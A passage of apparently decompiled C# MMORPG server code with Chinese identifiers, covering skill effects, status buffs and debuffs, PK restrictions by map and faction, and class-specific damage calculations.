							return;
						case 6002101:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (value34.神女异常状态 != null && value34.神女异常状态.ContainsKey(35))
							{
								value34.神女异常状态[35].时间结束事件();
							}
							if ((value34.神女异常状态.ContainsKey(50) || value34.神女异常状态.ContainsKey(51)) && (!value34.神女异常状态.ContainsKey(34) || !value34.神女异常状态.ContainsKey(35)) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
							{
								double num6 = value34.Player_Level * 2;
								神女异常状态类 value7 = new 神女异常状态类(value34, 60000, 34, 0.0, num6);
								value34.神女异常状态.Add(34, value7);
								value34.FLD_神女_追加_攻击 -= (int)num6;
								value34.FLD_神女_追加_防御 -= (int)num6;
								value34.更新HP_MP_SP();
								value34.更新武功和状态();
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							return;
						case 6002102:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (value34.神女异常状态 != null && value34.神女异常状态.ContainsKey(34))
							{
								value34.神女异常状态[34].时间结束事件();
							}
							if ((value34.神女异常状态.ContainsKey(50) || value34.神女异常状态.ContainsKey(51)) && (!value34.神女异常状态.ContainsKey(34) || !value34.神女异常状态.ContainsKey(35)) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
							{
								double num10 = value34.Player_Level * 2;
								double num11 = value34.Player_Level;
								神女异常状态类 value30 = new 神女异常状态类(value34, 60000, 35, 0.0, num10);
								value34.神女异常状态.Add(35, value30);
								value34.FLD_神女_追加_攻击 -= (int)num10;
								value34.FLD_神女_追加_防御 -= (int)num10;
								value34.更新HP_MP_SP();
								value34.更新武功和状态();
								神女异常状态类 value31 = new 神女异常状态类(this, 60000, 52, 0.0, num11);
								神女异常状态.Add(52, value31);
								base.FLD_神女_追加_攻击 += (int)num11;
								base.FLD_神女_追加_防御 += (int)num11;
								更新HP_MP_SP();
								更新武功和状态();
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							return;
						case 6002103:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if ((value34.神女异常状态.ContainsKey(50) || value34.神女异常状态.ContainsKey(51)) && !value34.神女异常状态.ContainsKey(36) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
							{
								神女异常状态类 value24 = new 神女异常状态类(value34, 60000, 36, 0.0, 0.0);
								value34.神女异常状态.Add(36, value24);
								value34.更新HP_MP_SP();
								value34.更新武功和状态();
								更新HP_MP_SP();
								更新武功和状态();
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							return;
						case 6002104:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
							}
							else
							{
								魔法使用(value23.FLD_MP);
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
								更新HP_MP_SP();
							}
							return;
						case 6002105:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
							}
							else
							{
								魔法使用(value23.FLD_MP);
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
								更新HP_MP_SP();
							}
							return;
						case 6002106:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if ((value34.神女异常状态.ContainsKey(50) || value34.神女异常状态.ContainsKey(51)) && !value34.神女异常状态.ContainsKey(39) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
							{
								神女异常状态类 value55 = new 神女异常状态类(value34, 6000, 39, 0.0, 0.0);
								value34.神女异常状态.Add(39, value55);
								value34.更新HP_MP_SP();
								value34.更新武功和状态();
								value34.超负荷等级 = 武功新[1, value23.FLD_INDEX].武功_等级;
								更新HP_MP_SP();
								更新武功和状态();
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							更新HP_MP_SP();
							return;
						case 6002301:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (value34.神女异常状态 != null && value34.神女异常状态.ContainsKey(46))
							{
								value34.神女异常状态[46].时间结束事件();
							}
							if (!value34.神女异常状态.ContainsKey(46))
							{
								神女异常状态类 value32 = new 神女异常状态类(value34, 60000, 46, 0.0, 0.0);
								value34.神女异常状态.Add(46, value32);
								value34.更新HP_MP_SP();
								value34.更新武功和状态();
								更新HP_MP_SP();
								更新武功和状态();
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							return;
						case 6002302:
						{
							if (组队id == 0)
							{
								return;
							}
							if (World.Teams.TryGetValue(组队id, out var value28) && value34.人物全服ID == base.人物全服ID)
							{
								foreach (Players value84 in value28.组队列表.Values)
								{
									if (value84 != null && 查找范围玩家(1000, value84) && !value84.神女异常状态.ContainsKey(46))
									{
										神女异常状态类 value29 = new 神女异常状态类(value84, 60000, 46, 0.0, 0.0);
										value84.神女异常状态.Add(46, value29);
										value84.更新HP_MP_SP();
										value84.更新武功和状态();
										更新HP_MP_SP();
										更新武功和状态();
									}
								}
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							return;
						}
						case 6002303:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (value34.神女异常状态 != null && value34.神女异常状态.ContainsKey(49))
							{
								value34.神女异常状态[49].时间结束事件();
							}
							if ((value34.神女异常状态.ContainsKey(50) || value34.神女异常状态.ContainsKey(51)) && !value34.神女异常状态.ContainsKey(48) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
							{
								神女异常状态类 value67 = new 神女异常状态类(value34, 60000, 48, 0.0, 0.0);
								value34.神女异常状态.Add(48, value67);
								value34.更新HP_MP_SP();
								value34.更新武功和状态();
								更新HP_MP_SP();
								更新武功和状态();
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							return;
						case 6002304:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (value34.神女异常状态 != null && value34.神女异常状态.ContainsKey(48))
							{
								value34.神女异常状态[48].时间结束事件();
							}
							if ((value34.神女异常状态.ContainsKey(50) || value34.神女异常状态.ContainsKey(51)) && !value34.神女异常状态.ContainsKey(49) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
							{
								神女异常状态类 value48 = new 神女异常状态类(value34, 60000, 49, 0.0, 0.0);
								value34.神女异常状态.Add(49, value48);
								value34.更新HP_MP_SP();
								value34.更新武功和状态();
								更新HP_MP_SP();
								更新武功和状态();
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							return;
						case 6002305:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (value34.神女异常状态 != null && value34.神女异常状态.ContainsKey(50))
							{
								value34.神女异常状态[50].时间结束事件();
							}
							if (!value34.神女异常状态.ContainsKey(50))
							{
								int 时间3 = ((武功新[1, value23.FLD_INDEX].武功_等级 == 3) ? 7000 : ((武功新[1, value23.FLD_INDEX].武功_等级 != 2) ? 3000 : 5000));
								神女异常状态类 value14 = new 神女异常状态类(value34, 时间3, 50, 0.0, 0.0);
								value34.神女异常状态.Add(50, value14);
								value34.更新HP_MP_SP();
								value34.更新武功和状态();
								更新HP_MP_SP();
								更新武功和状态();
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							return;
						case 6002306:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
							}
							else
							{
								if (组队id == 0)
								{
									return;
								}
								if (World.Teams.TryGetValue(组队id, out var value87) && value34.人物全服ID == base.人物全服ID)
								{
									foreach (Players value85 in value87.组队列表.Values)
									{
										if (value85 != null && 查找范围玩家(1000, value85))
										{
											if (value85.神女异常状态 != null && value85.神女异常状态.ContainsKey(50))
											{
												value85.神女异常状态[50].时间结束事件();
											}
											if (!value85.神女异常状态.ContainsKey(51))
											{
												神女异常状态类 value2 = new 神女异常状态类(value85, 3000, 51, 0.0, 0.0);
												value85.神女异常状态.Add(51, value2);
												value85.更新HP_MP_SP();
												value85.更新武功和状态();
												更新HP_MP_SP();
												更新武功和状态();
											}
										}
									}
								}
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							}
							return;
						case 6002201:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (value34.神女异常状态 != null && value34.神女异常状态.ContainsKey(41))
							{
								value34.神女异常状态[41].时间结束事件();
							}
							if ((value34.神女异常状态.ContainsKey(50) || value34.神女异常状态.ContainsKey(51)) && !value34.神女异常状态.ContainsKey(40) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
							{
								int 时间 = ((武功新[1, value23.FLD_INDEX].武功_等级 == 3) ? 7000 : ((武功新[1, value23.FLD_INDEX].武功_等级 != 2) ? 3000 : 5000));
								神女异常状态类 value43 = new 神女异常状态类(value34, 时间, 40, 0.0, 0.0);
								value34.神女异常状态.Add(40, value43);
								value34.神女虚弱ID = base.人物全服ID;
								value34.更新HP_MP_SP();
								value34.更新武功和状态();
								更新HP_MP_SP();
								更新武功和状态();
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							return;
						case 6002202:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (value34.神女异常状态 != null && value34.神女异常状态.ContainsKey(41))
							{
								value34.神女异常状态[41].时间结束事件();
							}
							if ((value34.神女异常状态.ContainsKey(50) || value34.神女异常状态.ContainsKey(51)) && !value34.神女异常状态.ContainsKey(41) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
							{
								int 时间2 = ((武功新[1, value23.FLD_INDEX].武功_等级 == 3) ? 7000 : ((武功新[1, value23.FLD_INDEX].武功_等级 != 2) ? 3000 : 5000));
								神女异常状态类 value8 = new 神女异常状态类(value34, 时间2, 41, 0.0, 0.0);
								value34.神女异常状态.Add(41, value8);
								value34.神女虚弱ID = base.人物全服ID;
								value34.更新HP_MP_SP();
								value34.更新武功和状态();
								更新HP_MP_SP();
								更新武功和状态();
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							return;
						case 6002203:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (人物ID == base.人物全服ID)
							{
								系统提示("只能对别人施放");
								return;
							}
							if (神女异常状态 != null && 神女异常状态.ContainsKey(42))
							{
								神女异常状态[42].时间结束事件();
							}
							if ((value34.神女异常状态.ContainsKey(50) || value34.神女异常状态.ContainsKey(51)) && !神女异常状态.ContainsKey(42) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
							{
								神女异常状态类 value49 = new 神女异常状态类(this, 60000, 42, 0.0, 0.0);
								神女异常状态.Add(42, value49);
								更新HP_MP_SP();
								更新武功和状态();
								更新HP_MP_SP();
								更新武功和状态();
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							return;
						case 6002204:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (value34.神女异常状态 != null && value34.神女异常状态.ContainsKey(43))
							{
								value34.神女异常状态[43].时间结束事件();
							}
							if (!value34.神女异常状态.ContainsKey(43))
							{
								神女异常状态类 value35 = new 神女异常状态类(value34, 10000, 43, 0.0, 0.0);
								value34.神女异常状态.Add(43, value35);
								value34.神女虚弱ID = base.人物全服ID;
								value34.更新HP_MP_SP();
								value34.更新武功和状态();
								更新HP_MP_SP();
								更新武功和状态();
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							return;
						case 6002205:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
							}
							if (人物ID == base.人物全服ID)
							{
								系统提示("只能对别人施放");
								return;
							}
							if (value34.神女异常状态 != null && value34.神女异常状态.ContainsKey(44))
							{
								value34.神女异常状态[44].时间结束事件();
							}
							if (!value34.神女异常状态.ContainsKey(44))
							{
								神女异常状态类 value19 = new 神女异常状态类(value34, 5000, 44, 0.0, 0.0);
								value34.神女异常状态.Add(44, value19);
								value34.神女虚弱ID = base.人物全服ID;
								value34.更新HP_MP_SP();
								value34.更新武功和状态();
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, 0);
							}
							更新HP_MP_SP();
							break;
						case 501701:
							if (value34.检查烈日炎炎状态())
							{
								value34.追加状态列表[1008001169].时间结束事件();
							}
							if (new Random().NextDouble() < base.升天四式_望梅添花)
							{
								if (value34.追加状态列表.ContainsKey(1008001174))
								{
									value34.追加状态列表[1008001174].时间结束事件();
								}
								double num7 = 10000.0;
								追加状态类 value13 = new 追加状态类(value34, (int)num7, 1008001174, 0);
								value34.追加状态列表.Add(1008001174, value13);
								value34.状态效果(BitConverter.GetBytes(1008001174), 1, (int)num7);
								value34.人物追加最大_HP += 1000;
								value34.更新HP_MP_SP();
								value34.显示大字(人物ID, 354);
								显示大字(人物ID, 354);
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 0, 0, value34.人物_HP, 0, 0);
							break;
						case 901501:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
							}
							else if (检查毒蛇出洞状态())
							{
								value34.追加状态列表[1008001170].时间结束事件();
								if (value34.GetAddState(901501))
								{
									value34.追加状态列表[901501].时间结束事件();
								}
								魔法使用(value23.FLD_MP);
								追加状态类 value6 = new 追加状态类(value34, 3000, 401302, 0);
								value34.追加状态列表.Add(901501, value6);
								value34.状态效果(BitConverter.GetBytes(901501), 1, 3000);
								value34.addFLD_追加百分比_防御(0.1);
								发送攻击人物数据(this, 人物ID, 武功ID, 0, 0, value34.人物_HP, 0, 0);
								更新HP_MP_SP();
							}
							break;
						case 6001201:
							if (value34.检查烈日炎炎状态())
							{
								value34.追加状态列表[1008001169].时间结束事件();
							}
							if (new Random().NextDouble() < base.升天四式_望梅添花)
							{
								if (value34.追加状态列表.ContainsKey(1008001174))
								{
									value34.追加状态列表[1008001174].时间结束事件();
								}
								double num82 = 10000.0;
								追加状态类 value56 = new 追加状态类(value34, (int)num82, 1008001174, 0);
								value34.追加状态列表.Add(1008001174, value56);
								value34.状态效果(BitConverter.GetBytes(1008001174), 1, (int)num82);
								value34.人物追加最大_HP += 1000;
								value34.更新HP_MP_SP();
								value34.显示大字(人物ID, 614);
								显示大字(人物ID, 614);
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 0, 0, value34.人物_HP, 0, 0);
							break;
						}
						if (base.人物PK模式 != 1)
						{
							goto IL_55f7;
						}
						if (World.仙魔大战进程 != 0)
						{
							if (!(base.仙魔大战派别 == value34.仙魔大战派别))
							{
								goto IL_55f7;
							}
							系统提示("仙魔大战中同种族禁止pk....", 9, "系统提示");
						}
						else if (World.势力战进程 != 0)
						{
							if (base.Player_Zx != value34.Player_Zx)
							{
								goto IL_55f7;
							}
							系统提示("势力战中同势力禁止pk....", 9, "系统提示");
						}
						else
						{
							if (base.Player_Zx != value34.Player_Zx)
							{
								goto IL_55f7;
							}
							系统提示("同派系禁止pk修改pk模式在试试....", 9, "系统提示");
						}
					}
					return;
				}
				goto end_IL_0001;
				IL_7d24:
				if (base.人物坐标_地图 != 801 && base.人物坐标_地图 != 8001 && base.人物坐标_地图 != 41001 && base.人物坐标_地图 != 7301 && base.人物坐标_地图 != 42001 && Math.Abs(base.Player_Level - value34.Player_Level) > World.PK等级差)
				{
					系统提示("等级差" + World.PK等级差 + "以上，不能攻击。");
					return;
				}
				if (value34.Player无敌)
				{
					系统提示("对方刚刚复活, 请慢点攻击。", 50, "系统提示");
					return;
				}
				发送打坐数据();
				if (value23.FLD_武功类型 == 3)
				{
					int num50 = value23.FLD_MP + (武功新[value23.FLD_武功类型, value23.FLD_INDEX].武功_等级 - 1) * value23.FLD_每级加MP;
					if (base.人物_MP >= num50)
					{
						魔法使用(num50);
						goto IL_7f1b;
					}
					魔法不足提示();
				}
				else if (value23.FLD_武功类型 == 2 && base.Player_Job != 13)
				{
					if (base.人物_MP >= base.夫妻武功攻击力MP)
					{
						魔法使用(base.夫妻武功攻击力MP);
						goto IL_7f1b;
					}
					魔法不足提示();
				}
				else
				{
					if (base.人物_MP >= value23.FLD_MP)
					{
						魔法使用(value23.FLD_MP);
						goto IL_7f1b;
					}
					魔法不足提示();
					PkID = 0;
				}
				goto end_IL_0001;
				IL_55f7:
				foreach (int item in World.限制PK地图列表)
				{
					if (base.人物坐标_地图 == item)
					{
						系统提示("此地图禁止PK", 9, "地图限制");
						return;
					}
				}
				if (World.工作日限时地图是否开启 == 0)
				{
					foreach (int item2 in World.周末全天PK地图列表)
					{
						if (base.人物坐标_地图 == item2)
						{
							系统提示("此地图本时间段禁止PK", 9, "系统提示");
							return;
						}
					}
				}
				if (World.限时地图是否开启 == 0)
				{
					foreach (int item3 in World.限时PK地图列表)
					{
						if (base.人物坐标_地图 == item3)
						{
							系统提示("此地图本时间段禁止PK", 9, "系统提示");
							return;
						}
					}
				}
				if (base.人物坐标_地图 == 42001 && base.门派联盟盟主 == value34.门派联盟盟主)
				{
					系统提示("攻城战中不能击杀本帮派成员。");
				}
				else
				{
					if ((base.人物PK模式 == 0 && !base.Client.假人 && !是假人) || value34.GM模式 == 8 || 人物ID == base.人物全服ID || 触发新手安全区(this) || 触发新手安全区(value34) || base.Player_Level < 35 || value34.Player_Level < 35 || (base.人物坐标_地图 == 7301 && base.帮派名字 == value34.帮派名字) || (value23.FLD_ZX != 0 && base.Player_Zx != value23.FLD_ZX) || (base.Player_Job_leve < value23.FLD_JOBLEVEL && base.Player_Job_leve < value23.FLD_JOBLEVEL - 1))
					{
						return;
					}
					float num26 = value34.人物坐标_X - base.人物坐标_X;
					float num27 = value34.人物坐标_Y - base.人物坐标_Y;
					double num28 = Math.Sqrt((double)num26 * (double)num26 + (double)num27 * (double)num27);
					switch (base.Player_Job)
					{
					default:
						if (num28 > World.其他职业PK距离)
						{
							return;
						}
						break;
					case 11:
						if (num28 > 70.0 + base.梅_玄武的指点)
						{
							return;
						}
						break;
					case 5:
						if (num28 > World.医生PK距离)
						{
							return;
						}
						break;
					case 4:
						if (num28 > World.弓箭手PK距离 + base.弓_猎鹰之眼)
						{
							return;
						}
						break;
					}
					if (value34.人物坐标_地图 == 2301 || base.人物坐标_地图 == 2301 || base.人物坐标_地图 == 7301 || value34.人物坐标_地图 == 7301 || value34.人物坐标_地图 == 41001 || base.人物坐标_地图 == 41001 || value34.人物坐标_地图 == 801 || base.人物坐标_地图 == 801 || value34.人物坐标_地图 == 42001 || base.人物坐标_地图 == 42001)
					{
						goto IL_7d24;
					}
					if (value34.检查玩家是否在挂机双倍区域(this) && value34.追加状态列表.ContainsKey(900000619))
					{
						value34.安全模式 = 0;
					}
					else if (!value34.检查玩家是否在挂机双倍区域(this) && value34.追加状态列表.ContainsKey(900000619))
					{
						value34.安全模式 = 1;
					}
					if (value34.安全模式 == 1 && !value34.安全区禁止下毒(this))
					{
						系统提示("对方处于安全模式中, 禁止攻击。");
						return;
					}
					if (安全模式 != 1 || 安全区禁止下毒(this))
					{
						goto IL_7d24;
					}
					系统提示("处于安全模式中, 禁止攻击。");
					return;
				}
				goto end_IL_0001;
				IL_5b4a:
				double num31;
				if (base.Player_Job == 7)
				{
					if (!检查和弦状态())
					{
						if ((double)RNG.Next(1, 100) < base.琴师_梅花三弄)
						{
							显示大字(人物ID, 87);
							int num29 = RNG.Next(1, 100);
							int num30;
							if (num29 <= 33)
							{
								num30 = 900401;
								base.琴师状态 = 16;
							}
							else if (num29 >= 33 && num29 <= 66)
							{
								num30 = 900402;
								base.琴师状态 = 32;
							}
							else
							{
								num30 = 900403;
								base.琴师状态 = 64;
							}
							追加状态类 value57 = new 追加状态类(this, 10000, num30, 0);
							追加状态列表.Add(num30, value57);
							状态效果(BitConverter.GetBytes(num30), 1, 10000);
							更新人物数据(this);
						}
					}
					else if (追加状态列表.ContainsKey(900401))
					{
						if ((double)RNG.Next(1, 100) < base.琴_三和弦_状态效果)
						{
							if (random.Next(10, 12) == 10)
							{
								if (!value34.异常状态.ContainsKey(10))
								{
									异常状态类 异常状态类2 = new 异常状态类(value34, 10000, 10, num31);
									异常状态类2.异常状态类出血(num31);
									value34.异常状态.Add(10, 异常状态类2);
								}
							}
							else if (!value34.异常状态.ContainsKey(11))
							{
								double num32 = 10000.0 + base.琴师_阳明春晓 * 1000.0;
								异常状态类 value58 = new 异常状态类(value34, (int)num32, 11, 0.0);
								value34.异常状态.Add(11, value58);
							}
						}
						if ((double)RNG.Next(1, 100) < base.琴师_阳明春晓 && !value34.异常状态.ContainsKey(1))
						{
							double num33 = 10000.0 + base.琴师_阳明春晓 * 100000.0;
							异常状态类 value59 = new 异常状态类(value34, (int)num33, 1, base.琴师_阳明春晓 * 0.016);
							value34.异常状态.Add(1, value59);
							value34.FLD_药品_减少攻击 -= base.琴师_阳明春晓 * 0.016;
						}
						if ((double)RNG.Next(1, 100) < base.琴师_潇湘雨夜 && !value34.异常状态.ContainsKey(2))
						{
							double num35 = 10000.0 + base.琴师_潇湘雨夜 * 100000.0;
							异常状态类 value60 = new 异常状态类(value34, (int)num35, 2, base.琴师_潇湘雨夜 * 0.016);
							value34.异常状态.Add(2, value60);
							value34.FLD_药品_减少防御 -= base.琴师_潇湘雨夜 * 0.016;
						}
					}
					else if (追加状态列表.ContainsKey(900402) && value23.FLD_TYPE != 4)
					{
						if ((double)RNG.Next(1, 100) < base.琴师_鸾凤和鸣 + base.琴师_升天一气功_飞花点翠 * 0.2)
						{
							显示大字(人物ID, 88);
							base.琴_七和弦_状态效果 *= 2.0 * (1.0 + base.琴师_升天一气功_飞花点翠 * 0.005);
						}
						num31 *= 1.0 + base.琴_七和弦_状态效果;
					}
					if ((double)RNG.Next(1, 100) <= base.升天五式_龙爪纤指手)
					{
						显示大字(base.人物全服ID, 1019);
						num31 *= 1.3;
					}
				}
				else if (base.Player_Job == 8)
				{
					double num36 = 0.0;
					if (韩飞官_天魔狂血叠加次数 >= 2)
					{
						显示大字(base.人物全服ID, 20252);
						num36 = base.韩_升天二气功_天魔护体;
						if (韩飞官_天魔狂血攻击力 > 0.0)
						{
							num31 += 韩飞官_天魔狂血攻击力;
							韩飞官_天魔狂血攻击力 = 0.0;
						}
						韩飞官_天魔狂血叠加次数 = 0;
					}
					if ((double)RNG.Next(1, 100) <= base.真武绝击)
					{
						显示大字(base.人物全服ID, 17);
						num31 *= 得到气功加成值(8, 8, 1);
					}
					if ((double)RNG.Next(1, 100) <= base.暗影绝杀)
					{
						显示大字(base.人物全服ID, 18);
						num31 *= 得到气功加成值(8, 11, 1);
					}
					if ((double)RNG.Next(1, 110) <= base.韩_升天一气功_行风弄舞 + num36)
					{
						显示大字(base.人物全服ID, 600);
						num31 *= 1.25;
					}
					else if (value23.FLD_CDTIME > 0)
					{
						int num37 = RNG.Next(1, 120);
						if ((double)num37 <= base.韩_天魔狂血 * 2.0)
						{
							显示大字(base.人物全服ID, 252);
							num31 *= 1.2;
							韩飞官_天魔狂血叠加次数 = 1;
							if ((double)num37 <= base.韩_天魔狂血 - 10.0)
							{
								韩飞官_天魔狂血攻击力 = num31 * (0.5 + base.升天五式_天魔之力);
								韩飞官_天魔狂血叠加次数 = 2;
							}
						}
					}
					else
					{
						韩飞官_天魔狂血叠加次数 = 0;
						韩飞官_天魔狂血攻击力 = 0.0;
					}
					if (value23.FLD_PID == 1000501 && value34.异常状态 != null && !value34.GetAbnormalState(8))
					{
						异常状态类 value61 = new 异常状态类(value34, 2000, 8, 0.0);
						value34.异常状态.Add(8, value61);
						value34.人物锁定 = true;
					}
				}
				else if (base.Player_Job == 9)
				{
					if ((double)RNG.Next(1, 100) < base.谭_怒海狂澜)
					{
						num31 *= 得到气功加成值(9, 10, 1);
						显示大字(base.人物全服ID, 82);
					}
					if (触发缩影步 && value34.异常状态 != null && !value34.GetAbnormalState(26))
					{
						触发缩影步 = false;
						异常状态类 value62 = new 异常状态类(value34, 3000, 26, 0.0, base.人物全服ID);
						value34.异常状态.Add(26, value62);
						value34.人物锁定 = true;
						显示大字(base.人物全服ID, 277);
					}
					if (value23.FLD_武功类型 == 3 && 武功新[3, value23.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 >= 1)
					{
						显示大字(base.人物全服ID, 321);
						num31 += (double)天地同寿回避累积攻击力;
						天地同寿回避累积攻击力 = 0;
						天地同寿回避次数 = 0;
					}
					if (触发天地回流)
					{
						触发天地回流 = false;
						num31 *= 1.45;
						显示大字(base.人物全服ID, 277);
					}
				}
				else if (base.Player_Job == 10)
				{
					if (num78 == 3000109)
					{
						num31 *= 1.45;
					}
					if (num78 != 0)
					{
						if ((double)RNG.Next(1, 100) <= base.拳师_会心一击)
						{
							显示大字(base.人物全服ID, 557);
							num31 *= 1.0 + 拳师会心一击威力;
						}
						if ((double)RNG.Next(1, 100) <= base.拳_升天一气功_夺命连环)
						{
							显示大字(base.人物全服ID, 561);
							num31 *= 1.45;
						}
					}
					else if ((double)RNG.Next(1, 100) <= base.拳师_会心一击)
					{
						显示大字(base.人物全服ID, 557);
						num31 *= 1.0 + 拳师会心一击威力 / 2.0;
					}
				}
				else if (base.Player_Job == 11)
				{
					if ((double)RNG.Next(1, 100) <= base.梅_玄武强击 * 得到气功加成值(base.Player_Job, 5, 0))
					{
						num31 *= 1.0 + base.梅_玄武强击 * 得到气功加成值(base.Player_Job, 5, 1);
					}
					if ((value34.Player_Job == 2 || value34.Player_Job == 9) && base.梅_嫉妒的化身 > 0.0 && (double)RNG.Next(1, 100) <= base.梅_嫉妒的化身)
					{
						num31 *= 1.0 + 得到气功加成值(base.Player_Job, 9, 1);
						显示大字(base.人物全服ID, 808);
					}
					if ((double)RNG.Next(1, 100) <= base.梅_升天一气功_玄武雷电)
					{
						num31 *= 1.4;
						显示大字(base.人物全服ID, 803);
					}
					if (base.人物坐标_地图 != 7301 && (double)RNG.Next(1, 100) <= base.梅_升天二气功_玄武诅咒)
					{
						num31 += (double)base.人物最大_HP * 0.2;
						显示大字(base.人物全服ID, 806);
					}
				}
				else if (base.Player_Job == 12)
				{
					if ((double)RNG.Next(1, 100) <= base.真武绝击)
					{
						显示大字(base.人物全服ID, 17);
						num31 *= 得到气功加成值(12, 6, 1);
					}
					double num38 = RNG.Next(1, 100);
					if (base.流星漫天 > 0.0 && base.流星漫天 + base.升天五式_破空坠星 >= (double)RNG.Next(1, 100))
					{
						double num39 = RNG.Next(0, 100);
						显示大字(base.人物全服ID, 1005);
						if (base.弱点攻破 >= num39)
						{
							if (base.卢_破血狂风 > 0.0 && base.卢_破血狂风 >= num38)
							{
								num31 *= 2.0;
								显示大字(base.人物全服ID, 1012);
							}
							else
							{
								num31 *= 1.45;
							}
							显示大字(base.人物全服ID, 1009);
						}
						else if (base.技冠群雄 >= (double)RNG.Next(0, 100))
						{
							显示大字(base.人物全服ID, 1013);
							num31 *= 2.0;
						}
					}
				}
				else if (base.Player_Job == 13)
				{
					num31 *= 1.0 + base.神女长功击力;
					int num40 = RNG.Next(1, 100);
					if (base.神女杀星义虎 >= (double)RNG.Next(1, 100))
					{
						触发杀星义气虎 = true;
						显示大字(base.人物全服ID, 1027);
						num31 *= 1.15 + base.神女杀星义气;
					}
					触发杀星义气杀 = false;
					if ((double)num40 <= base.神女杀星义杀 && !触发杀星义气虎)
					{
						触发杀星义气杀 = true;
						显示大字(base.人物全服ID, 1026);
						num31 *= 1.35 + base.神女杀星义气;
					}
					if (base.神女真武绝击 >= (double)RNG.Next(1, 100))
					{
						num31 *= 1.4;
						显示大字(base.人物全服ID, 17);
					}
					if (base.神女蛊毒解除 >= (double)RNG.Next(1, 100))
					{
						num31 *= 1.1;
						显示大字(base.人物全服ID, 1025);
					}
					if (base.神女愤怒调节 > 0.0 && base.神女愤怒调节 > (double)new Random().Next(1, 100))
					{
						if (!value34.怒)
						{
							value34.人物_SP = 0;
						}
						else
						{
							value34.清除怒气();
						}
						显示大字(base.人物全服ID, 1024);
						value34.更新HP_MP_SP();
					}
				}
				int num41 = new Random().Next(1, 125);
				if (base.升天五式_致残 > 0.0 && base.升天五式_致残 > (double)num41 && !value34.检查致残状态())
				{
					显示大字(人物ID, 1014);
					追加状态类 value63 = new 追加状态类(value34, 1500, 1008002012, 0);
					value34.追加状态列表.Add(1008002012, value63);
					value34.状态效果(BitConverter.GetBytes(1008002012), 1, 1500);
					value34.更新人物数据(value34);
					value34.更新广播人物数据();
					value34.吃药时间 = DateTime.Now.AddSeconds(1.5);
				}
				goto IL_6bdd;
				IL_7f1b:
				更新HP_MP_SP();
